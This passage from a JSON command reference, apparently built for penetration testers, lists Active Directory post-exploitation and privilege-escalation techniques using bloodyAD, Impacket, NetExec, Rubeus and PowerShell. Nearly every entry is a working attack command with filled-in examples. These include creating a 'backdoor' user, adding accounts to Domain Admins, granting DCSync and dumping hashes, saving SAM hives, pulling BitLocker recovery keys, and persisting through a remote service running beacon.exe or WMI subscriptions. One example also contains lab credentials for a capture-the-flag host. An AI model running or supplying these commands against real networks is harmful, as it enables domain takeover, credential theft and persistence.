          "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' remove groupMember '<group>' '<member>'"
        }
      ],
      "references": [
        {
          "title": "bloodyAD",
          "url": "https://github.com/CravateRouge/bloodyAD"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add groupMember 'Domain Admins' jdoe"
      ]
    },
    {
      "id": "bloodyad-add-user",
      "name": "bloodyAD Create User",
      "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add user <new_user> <new_password>",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Create a new domain user object. Requires Create Child rights on a Users container (which OU operators / certain custom roles often have). Useful for establishing persistence or a clean staging account.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "user",
        "create",
        "persistence"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p :<hash> add user <new_user> <new_password>"
        },
        {
          "label": "Custom OU",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add user <new_user> <new_password> --path 'OU=Staff,DC=corp,DC=local'"
        }
      ],
      "references": [
        {
          "title": "bloodyAD docs",
          "url": "https://github.com/CravateRouge/bloodyAD/wiki"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add user backdoor 'P@ssw0rd!23'"
      ]
    },
    {
      "id": "bloodyad-remove-object",
      "name": "bloodyAD remove object",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' remove object '<dn>'",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Delete an arbitrary AD object you have rights on. Cleanup step for accounts/computers you created mid-engagement, or destructive action against attacker-owned scratch objects.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "cleanup",
        "ldap"
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u admin -p 'Password123!' remove object 'CN=pwndmsa,CN=Managed Service Accounts,DC=corp,DC=local'"
      ]
    },
    {
      "id": "bloodyad-set-restore",
      "name": "bloodyAD set restore",
      "command": "bloodyAD --host <dc-ip> -d '<domain>' -u '<user>' -p '<password>' set restore '<deleted-dn>'",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Restore a tombstoned object from the AD recycle bin. Useful for resurrecting accounts you accidentally deleted during an engagement, or for recovering objects a defender purged mid-test.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "recycle-bin",
        "restore"
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u admin -p 'Password123!' set restore 'CN=svc_app\\0ADEL:abcd...,CN=Deleted Objects,DC=corp,DC=local'"
      ]
    },
    {
      "id": "impacket-addcomputer",
      "name": "Impacket addcomputer.py",
      "command": "impacket-addcomputer '<domain>/<user>:<password>' -computer-name '<computer-name>$' -computer-pass '<computer-pass>' -dc-ip <dc-ip>",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Add a machine account to the domain using the default MachineAccountQuota (10). Foundation step for RBCD, shadow credentials, and other attacks that need a controlled SPN.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "smb"
      ],
      "tags": [
        "impacket",
        "addcomputer",
        "maq",
        "rbcd"
      ],
      "variations": [
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "impacket-addcomputer '<domain>/<user>' -hashes :<nt-hash> -computer-name '<computer-name>$' -computer-pass '<computer-pass>' -dc-ip <dc-ip>"
        },
        {
          "label": "LDAPS Method",
          "requires": "password",
          "command": "impacket-addcomputer '<domain>/<user>:<password>' -computer-name '<computer-name>$' -computer-pass '<computer-pass>' -dc-ip <dc-ip> -method LDAPS"
        }
      ],
      "examples": [
        "impacket-addcomputer 'corp.local/jdoe:Password123!' -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' -dc-ip 10.10.10.10"
      ]
    },
    {
      "id": "impacket-net",
      "name": "Impacket Net",
      "command": "impacket-net '<domain>/<user>:<password>'@'<ip>' user",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Enumerate AD users, groups, and shares via Net commands over SMB",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "net",
        "users",
        "enumeration",
        "smb"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-net -hashes ':<hash>' '<domain>/<user>'@'<ip>' user"
        },
        {
          "label": "List Groups",
          "requires": "password",
          "command": "impacket-net '<domain>/<user>:<password>'@'<ip>' group"
        },
        {
          "label": "List Shares",
          "requires": "password",
          "command": "impacket-net '<domain>/<user>:<password>'@'<ip>' share"
        }
      ],
      "examples": [
        "impacket-net 'CORP.LOCAL/user:password'@192.168.1.100 user"
      ]
    },
    {
      "id": "impacket-reg",
      "name": "Impacket Remote Registry",
      "command": "impacket-reg '<domain>/<user>:<password>@<ip>' query -keyName '<HKLM\\\\path>'",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Query, add, or save remote registry hives over SMB without dropping a binary on the host. Commonly used to read AutoLogon credentials, dump SAM/SECURITY/SYSTEM, or check for sensitive policies.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "reg",
        "registry",
        "remote",
        "post-exploitation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-reg -hashes ':<hash>' '<domain>/<user>@<ip>' query -keyName '<HKLM\\\\path>'"
        },
        {
          "label": "Save SAM/SYSTEM/SECURITY",
          "requires": "password",
          "command": "impacket-reg '<domain>/<user>:<password>@<ip>' save -keyName HKLM\\\\SAM -o \\\\\\\\<ip>\\\\C$\\\\Windows\\\\Temp\\\\sam.save"
        },
        {
          "label": "Read AutoLogon",
          "requires": "password",
          "command": "impacket-reg '<domain>/<user>:<password>@<ip>' query -keyName 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon'"
        }
      ],
      "references": [
        {
          "title": "Impacket — reg.py",
          "url": "https://github.com/fortra/impacket/blob/master/examples/reg.py"
        }
      ],
      "examples": [
        "impacket-reg 'CORP/jdoe:Password123!@10.10.10.10' query -keyName 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon'",
        "impacket-reg -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/admin@10.10.10.10' save -keyName HKLM\\\\SAM -o '\\\\\\\\10.10.10.10\\\\C$\\\\Temp\\\\sam.save'"
      ]
    },
    {
      "id": "impacket-services",
      "name": "Impacket Remote Services",
      "command": "impacket-services '<domain>/<user>:<password>@<ip>' list",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Enumerate, create, start, stop, and delete Windows services on a remote host through MS-SCMR. Useful for service-based persistence, hijacking weak service binaries, and silent execution paths.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "services",
        "scmr",
        "persistence",
        "post-exploitation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-services -hashes ':<hash>' '<domain>/<user>@<ip>' list"
        },
        {
          "label": "Create Service",
          "requires": "password",
          "command": "impacket-services '<domain>/<user>:<password>@<ip>' create -name <svc> -display <svc> -path '<binPath>'"
        },
        {
          "label": "Start Service",
          "requires": "password",
          "command": "impacket-services '<domain>/<user>:<password>@<ip>' start -name <svc>"
        },
        {
          "label": "Change Service Path",
          "requires": "password",
          "command": "impacket-services '<domain>/<user>:<password>@<ip>' change -name <svc> -path '<new_binPath>'"
        }
      ],
      "references": [
        {
          "title": "Impacket — services.py",
          "url": "https://github.com/fortra/impacket/blob/master/examples/services.py"
        }
      ],
      "examples": [
        "impacket-services 'CORP/admin:Password123!@10.10.10.10' list",
        "impacket-services 'CORP/admin:Password123!@10.10.10.10' create -name updater -display updater -path 'C:\\\\Temp\\\\beacon.exe'"
      ]
    },
    {
      "id": "impacket-wmiquery",
      "name": "Impacket WMI Query",
      "command": "impacket-wmiquery '<domain>/<user>:<password>'@'<ip>' -namespace 'root\\cimv2' -query 'SELECT * FROM Win32_Process'",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Execute WMI queries on a remote host to enumerate processes, services, and system info",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "wmi"
      ],
      "tags": [
        "impacket",
        "wmi",
        "query",
        "enumeration",
        "processes"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-wmiquery -hashes ':<hash>' '<domain>/<user>'@'<ip>' -namespace 'root\\cimv2' -query 'SELECT * FROM Win32_Process'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-wmiquery -k -no-pass '<domain>/<user>'@'<ip>' -namespace 'root\\cimv2' -query 'SELECT * FROM Win32_Process'"
        }
      ],
      "examples": [
        "impacket-wmiquery 'CORP.LOCAL/user:password'@192.168.1.100 -namespace 'root\\cimv2' -query 'SELECT * FROM Win32_Process'"
      ]
    },
    {
      "id": "ldapsearch-get-deleted-objects",
      "name": "LDAP Deleted Objects Query",
      "command": "ldapsearch -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b 'CN=Deleted Objects,DC=voleur,DC=htb' -s sub '(isDeleted=TRUE)' -E '!1.2.840.113556.1.4.417' dn cn distinguishedName lastKnownParent whenChanged isDeleted",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Query for deleted objects",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "ldapsearch",
        "ldap",
        "deleted",
        "objects"
      ],
      "examples": [
        "ldapsearch -H ldap://10.10.11.76 -D 'svc_ldap@voleur.htb' -w 'M1XyC9pW7qT5Vn' -b 'CN=Deleted Objects,DC=voleur,DC=htb' -s sub '(isDeleted=TRUE)' -E '!1.2.840.113556.1.4.417' dn cn distinguishedName lastKnownParent whenChanged isDeleted"
      ]
    },
    {
      "id": "nxc-ldap-add-computer",
      "name": "NetExec Add Machine Account",
      "command": "nxc ldap <dc-ip> -u <user> -p <password> -M add-computer -o NAME=<computer$> PASSWORD=<password>",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Create a new machine account using a low-privileged user (default ms-DS-MachineAccountQuota is 10). Required for many privilege-escalation chains: RBCD, Shadow Credentials, ESC8, etc.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "netexec",
        "machine-account",
        "maq",
        "rbcd",
        "shadow-credentials"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap <dc-ip> -u <user> -H <hash> -M add-computer -o NAME=<computer$> PASSWORD=<password>"
        },
        {
          "label": "Delete Computer",
          "requires": "password",
          "command": "nxc ldap <dc-ip> -u <user> -p <password> -M add-computer -o NAME=<computer$> DELETE=true"
        }
      ],
      "references": [
        {
          "title": "NetExec — add-computer module",
          "url": "https://www.netexec.wiki/ldap-protocol/add-computer"
        }
      ],
      "examples": [
        "nxc ldap 10.10.10.10 -u jdoe -p 'Password123!' -M add-computer -o NAME=PWNED$ PASSWORD=ComputerPass123!",
        "nxc ldap 10.10.10.10 -u jdoe -H :e19ccf75ee54e06b06a5907af13cef42 -M add-computer -o NAME=PWNED$ DELETE=true"
      ]
    },
    {
      "id": "enable-ad-account",
      "name": "PowerShell Enable AD Account",
      "command": "Enable-ADAccount -Identity <user>",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Enable disabled Active Directory account",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "powershell",
        "ad",
        "enable",
        "account"
      ],
      "examples": [
        "Enable-ADAccount -Identity 'disabled_user'"
      ]
    },
    {
      "id": "get-deleted-objects",
      "name": "PowerShell Get Deleted AD Objects",
      "command": "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Get deleted Active Directory objects",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "powershell",
        "ad",
        "deleted",
        "objects"
      ],
      "examples": [
        "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects"
      ]
    },
    {
      "id": "restore-ad-object",
      "name": "PowerShell Restore AD Object",
      "command": "Restore-ADObject -Identity <uid>",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Restore deleted Active Directory object",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "powershell",
        "ad",
        "restore",
        "object"
      ],
      "examples": [
        "Restore-ADObject -Identity 'CN=deleteduser\\0ADEL:12345678-1234-1234-1234-123456789012,CN=Deleted Objects,DC=corp,DC=local'"
      ]
    },
    {
      "id": "restore-deleted-user-object",
      "name": "PowerShell Restore Deleted User",
      "command": "Get-ADObject -Filter 'samaccountname -eq \"<user>\"' -IncludeDeletedObjects | Restore-ADObject",
      "category": "post-exploitation",
      "subcategory": "ad-object-manipulation",
      "description": "Restore Deleted User Object",
      "platform": "linux",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "powershell",
        "ad",
        "restore",
        "user",
        "deleted"
      ],
      "examples": [
        "Get-ADObject -Filter 'samaccountname -eq \"Todd.Wolfe\"' -IncludeDeletedObjects | Restore-ADObject"
      ]
    },
    {
      "id": "impacket-ntfs-read",
      "name": "Impacket NTFS-Read (Offline NTDS Browse)",
      "command": "impacket-ntfs-read <ntds_image_or_vss_dump>",
      "category": "post-exploitation",
      "subcategory": "data-collection",
      "description": "Browse a raw NTFS image (e.g. a VSS shadow copy of C:\\Windows\\NTDS) offline as if it were a filesystem. Use to extract NTDS.dit + SYSTEM hive after dumping a shadow copy when secretsdump direct methods are blocked.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "tags": [
        "impacket",
        "ntfs",
        "offline",
        "ntds",
        "vss",
        "shadow-copy"
      ],
      "references": [
        {
          "title": "Impacket — ntfs-read.py",
          "url": "https://github.com/fortra/impacket/blob/master/examples/ntfs-read.py"
        }
      ],
      "examples": [
        "impacket-ntfs-read shadowcopy.dd",
        "# inside the interactive shell:\nuse 1\ncd Windows\\NTDS\nget NTDS.dit"
      ]
    },
    {
      "id": "nxc-rdp-screenshot",
      "name": "NetExec RDP Screenshot",
      "command": "nxc rdp <ip> -u <user> -p <password> --screenshot",
      "category": "post-exploitation",
      "subcategory": "data-collection",
      "description": "Capture a screenshot of the current RDP login screen / desktop without authenticating into a session. Useful for spotting locked admin sessions and gathering information about the host.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "rdp"
      ],
      "tags": [
        "nxc",
        "netexec",
        "rdp",
        "screenshot",
        "recon"
      ],
      "variations": [
        {
          "label": "Authenticated Screenshot",
          "requires": "password",
          "command": "nxc rdp <ip> -u <user> -p <password> --screenshot --screentime 5"
        },
        {
          "label": "NLA Disabled (no creds)",
          "requires": "no-creds",
          "command": "nxc rdp <ip> --nla-screenshot"
        }
      ],
      "references": [
        {
          "title": "NetExec — RDP Protocol",
          "url": "https://www.netexec.wiki/rdp-protocol"
        }
      ],
      "examples": [
        "nxc rdp 10.10.10.10 --nla-screenshot",
        "nxc rdp 10.10.10.0/24 -u admin -p 'Password123!' --screenshot"
      ]
    },
    {
      "id": "nxc-smb-bitlocker",
      "name": "NetExec SMB BitLocker Recovery Keys",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M bitlocker",
      "category": "post-exploitation",
      "subcategory": "data-collection",
      "description": "Retrieve BitLocker recovery keys stored in Active Directory",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "ldap"
      ],
      "tags": [
        "nxc",
        "smb",
        "bitlocker",
        "recovery-key",
        "data-collection",
        "ad"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M bitlocker"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M bitlocker"
      ]
    },
    {
      "id": "nxc-wmi-bitlocker",
      "name": "NetExec WMI bitlocker Module",
      "command": "nxc wmi <target> -u '<user>' -p '<password>' -M bitlocker",
      "category": "post-exploitation",
      "subcategory": "data-collection",
      "description": "Pull BitLocker recovery keys from a host over WMI. Faster than the SMB equivalent in environments where DCOM/WMI is the only Windows-management protocol you can reach.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "wmi"
      ],
      "tags": [
        "netexec",
        "nxc",
        "wmi",
        "bitlocker"
      ],
      "examples": [
        "nxc wmi 10.10.10.10 -u administrator -p 'Password123!' -M bitlocker"
      ]
    },
    {
      "id": "smbclient-download",
      "name": "SMBClient Recursive Download",
      "command": "smbclient //<ip>/<share> -U \"<user>%<password>\" -c \"cd <path>; prompt; recurse; mget *\"",
      "category": "post-exploitation",
      "subcategory": "data-collection",
      "description": "Download folder recursively from SMB share",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "smbclient",
        "smb",
        "download",
        "files"
      ],
      "examples": [
        "smbclient //192.168.1.100/C$ -U \"administrator%password\" -c \"cd Users; prompt; recurse; mget *\""
      ]
    },
    {
      "id": "powershell-find",
      "name": "PowerShell File Search",
      "command": "Get-ChildItem -Path C:\\ -Include <file_pattern> -File -Recurse -ErrorAction SilentlyContinue",
      "category": "post-exploitation",
      "subcategory": "file-search",
      "description": "Search for files matching pattern in PowerShell",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "powershell",
        "search",
        "files"
      ],
      "examples": [
        "Get-ChildItem -Path C:\\ -Include *.pdf -File -Recurse -ErrorAction SilentlyContinue"
      ]
    },
    {
      "id": "impacket-schtasks",
      "name": "Impacket Scheduled Tasks",
      "command": "impacket-schtasks '<domain>/<user>:<password>'@'<ip>' -action create -taskname '<task>' -command '<cmd>'",
      "category": "post-exploitation",
      "subcategory": "persistence",
      "description": "Create, delete, or run scheduled tasks on a remote host via ATSVC",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb",
        "rpc"
      ],
      "tags": [
        "impacket",
        "schtasks",
        "scheduled-task",
        "persistence",
        "remote-execution"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-schtasks -hashes ':<hash>' '<domain>/<user>'@'<ip>' -action create -taskname '<task>' -command '<cmd>'"
        },
        {
          "label": "Delete Task",
          "requires": "password",
          "command": "impacket-schtasks '<domain>/<user>:<password>'@'<ip>' -action delete -taskname '<task>'"
        }
      ],
      "examples": [
        "impacket-schtasks 'CORP.LOCAL/user:password'@192.168.1.100 -action create -taskname 'Updater' -command 'cmd.exe /c whoami > C:\\\\out.txt'"
      ]
    },
    {
      "id": "impacket-wmipersist",
      "name": "Impacket WMI Persist",
      "command": "impacket-wmipersist '<domain>/<user>:<password>'@'<ip>' -action install -name '<name>' -executeOn 'TimerEvent' -command '<cmd>'",
      "category": "post-exploitation",
      "subcategory": "persistence",
      "description": "Install or remove WMI event subscriptions for remote persistence",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "wmi"
      ],
      "tags": [
        "impacket",
        "wmi",
        "persistence",
        "event-subscription",
        "remote"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-wmipersist -hashes ':<hash>' '<domain>/<user>'@'<ip>' -action install -name '<name>' -executeOn 'TimerEvent' -command '<cmd>'"
        },
        {
          "label": "Remove Persistence",
          "requires": "password",
          "command": "impacket-wmipersist '<domain>/<user>:<password>'@'<ip>' -action remove -name '<name>'"
        }
      ],
      "examples": [
        "impacket-wmipersist 'CORP.LOCAL/user:password'@192.168.1.100 -action install -name 'Updater' -executeOn 'TimerEvent' -command 'cmd.exe /c whoami > C:\\\\out.txt'"
      ]
    },
    {
      "id": "rubeus-ptt",
      "name": "Rubeus ptt (Pass-the-Ticket)",
      "command": "Rubeus.exe ptt /ticket:<base64-or-kirbi-path>",
      "category": "post-exploitation",
      "subcategory": "persistence",
      "description": "Inject a Kerberos ticket into the current logon session. Accepts base64 from asktgt/s4u output or a .kirbi file from disk. After injection, native Windows tooling (klist, dir \\\\target\\c$) just works.",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "rubeus",
        "ptt",
        "pass-the-ticket"
      ],
      "variations": [
        {
          "label": "Specific LUID",
          "requires": "local-admin",
          "command": "Rubeus.exe ptt /ticket:<ticket> /luid:0x<luid>"
        }
      ],
      "examples": [
        "Rubeus.exe ptt /ticket:doIFvjCC..."
      ]
    },
    {
      "id": "bloodyad-add-group",
      "name": "BloodyAD Add User to Group",
      "command": "bloodyAD --host <ip> -d '<domain>' -u '<user>' -p '<password>' add groupMember '<target_group>' '<target_user>'",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Add user to group using BloodyAD",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "acl",
        "group",
        "privilege-escalation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host <ip> -d '<domain>' -u '<user>' --hashes ':<hash>' add groupMember '<target_group>' '<target_user>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "bloodyAD --host <ip> -d '<domain>' -k add groupMember '<target_group>' '<target_user>'"
        }
      ],
      "examples": [
        "bloodyAD --host 192.168.1.100 -d 'CORP.LOCAL' -u 'user' -p 'password' add groupMember 'Domain Admins' 'targetuser'"
      ]
    },
    {
      "id": "bloodyad-dcsync",
      "name": "bloodyAD Grant DCSync",
      "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> add dcsync <target_user>",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Grant a target principal the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights on the domain object — i.e. give them DCSync. Requires WriteDacl on the domain. Pair with secretsdump for instant krbtgt extraction.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "dcsync",
        "acl",
        "writedacl",
        "privesc"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p :<hash> add dcsync <target_user>"
        },
        {
          "label": "Cleanup",
          "requires": "password",
          "command": "bloodyAD --host <dc-ip> -d <domain> -u <user> -p <password> remove dcsync <target_user>"
        }
      ],
      "references": [
        {
          "title": "bloodyAD docs",
          "url": "https://github.com/CravateRouge/bloodyAD/wiki"
        }
      ],
      "examples": [
        "bloodyAD --host 10.10.10.10 -d corp.local -u jdoe -p 'Password123!' add dcsync jdoe",
        "impacket-secretsdump -just-dc 'corp.local/jdoe:Password123!@10.10.10.10'"
      ]
    },
    {
      "id": "bloodyad-set-owner",
      "name": "BloodyAD Set Object Owner",
      "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' -p '<password>' set owner '<target_object>' '<owner>'",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Set object owner using BloodyAD",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "bloodyad",
        "acl",
        "owner",
        "dacl",
        "privilege-escalation"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "bloodyAD --host '<ip>' -d '<domain>' -u '<user>' --hashes ':<hash>' set owner '<target_object>' '<owner>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "bloodyAD --host '<ip>' -d '<domain>' -k set owner '<target_object>' '<owner>'"
        }
      ],
      "examples": [
        "bloodyAD --host '192.168.1.100' -d 'CORP.LOCAL' -u 'user' -p 'password' set owner 'CN=Target,DC=CORP,DC=LOCAL' 'attacker'"
      ]
    },
    {
      "id": "impacket-badsuccessor",
      "name": "Impacket badsuccessor",
      "command": "impacket-badsuccessor -action check '<domain>/<user>:<password>' -dc-ip '<ip>'",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Exploit the BadSuccessor vulnerability to escalate privileges via delegated Managed Service Accounts (dMSA)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "badsuccessor",
        "dmsa",
        "privilege-escalation",
        "acl"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-badsuccessor -action check -hashes ':<hash>' '<domain>/<user>' -dc-ip '<ip>'"
        },
        {
          "label": "Exploit (create dMSA)",
          "requires": "password",
          "command": "impacket-badsuccessor -action exploit -target-account '<target_user>' '<domain>/<user>:<password>' -dc-ip '<ip>'"
        }
      ],
      "examples": [
        "impacket-badsuccessor -action check 'CORP.LOCAL/user:password' -dc-ip '192.168.1.100'"
      ]
    },
    {
      "id": "dacledit",
      "name": "Impacket dacledit",
      "command": "impacket-dacledit -action 'write' -rights 'FullControl' -principal '<user>' -target '<target>' '<domain>/<user>:<password>' -dc-ip '<ip>'",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Read or write DACL entries on AD objects to grant or abuse ACL rights",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "dacl",
        "acl",
        "privilege-escalation",
        "write-dacl",
        "fullcontrol"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-dacledit -action 'write' -rights 'FullControl' -principal '<user>' -target '<target>' -hashes ':<hash>' '<domain>/<user>' -dc-ip '<ip>'"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-dacledit -action 'write' -rights 'FullControl' -principal '<user>' -target '<target>' -k -no-pass '<domain>/<user>' -dc-ip '<ip>'"
        },
        {
          "label": "Read DACL",
          "requires": "password",
          "command": "impacket-dacledit -action 'read' -target '<target>' '<domain>/<user>:<password>' -dc-ip '<ip>'"
        }
      ],
      "examples": [
        "impacket-dacledit -action 'write' -rights 'FullControl' -principal 'attacker' -target 'victim' 'CORP.LOCAL/user:password' -dc-ip '192.168.1.100'"
      ]
    },
    {
      "id": "impacket-dacledit",
      "name": "Impacket dacledit.py",
      "command": "impacket-dacledit -action write -rights FullControl -principal '<attacker>' -target '<victim>' '<domain>/<user>:<password>'",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Read, write, or remove DACL ACEs on AD objects from Linux. Use to grant yourself GenericAll/WriteDacl over a target user, group, or computer once you have an ACL-write primitive.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "dacledit",
        "acl",
        "dacl",
        "privilege-escalation"
      ],
      "variations": [
        {
          "label": "Read DACL",
          "requires": "password",
          "command": "impacket-dacledit -action read -target '<victim>' '<domain>/<user>:<password>'"
        },
        {
          "label": "Remove ACE",
          "requires": "password",
          "command": "impacket-dacledit -action remove -rights FullControl -principal '<attacker>' -target '<victim>' '<domain>/<user>:<password>'"
        }
      ],
      "references": [
        {
          "title": "Impacket dacledit",
          "url": "https://github.com/fortra/impacket/blob/master/examples/dacledit.py"
        }
      ],
      "examples": [
        "impacket-dacledit -action write -rights FullControl -principal jdoe -target itadmin corp.local/jdoe:'Password123!'"
      ]
    },
    {
      "id": "impacket-owneredit",
      "name": "Impacket owneredit",
      "command": "impacket-owneredit '<domain>/<user>:<password>' -action write -target <target> -new-owner <attacker> -dc-ip <dc-ip>",
      "category": "privilege-escalation",
      "subcategory": "acl-abuse",
      "description": "Read or rewrite the nTSecurityDescriptor owner of an AD object. Use after a WriteOwner edge to seize an object, then chain with dacledit to grant yourself GenericAll. Default action is read; pass -action write to commit.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "impacket",
        "owneredit",
        "acl-abuse",
        "writeowner"
      ],
      "variations": [
        {
          "label": "Read Current Owner",
          "requires": "password",
          "command": "impacket-owneredit '<domain>/<user>:<password>' -action read -target <target> -dc-ip <dc-ip>"
        },
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "impacket-owneredit '<domain>/<user>' -hashes :<nt-hash> -action write -target <target> -new-owner <attacker> -dc-ip <dc-ip>"
        },
        {
          "label": "Use LDAPS",
          "requires": "password",
          "command": "impacket-owneredit '<domain>/<user>:<password>' -action write -target <target> -new-owner <attacker> -dc-ip <dc-ip> -use-ldaps"
        }
      ],
      "examples": [
        "impacket-owneredit 'corp.local/jdoe:Password123!' -action write -target svc_app -new-owner jdoe -dc-ip 10.10.10.10"
      ]
    },
    {
      "id": "owneredit",
      "name": "Impacket owneredit",
      "command": "impacket-owneredit -action write -new-owner '<user>' -target '<target>' '<domain>/<user>:<password>' -dc-ip '<ip>'",
      "category": "privilege-escalation",
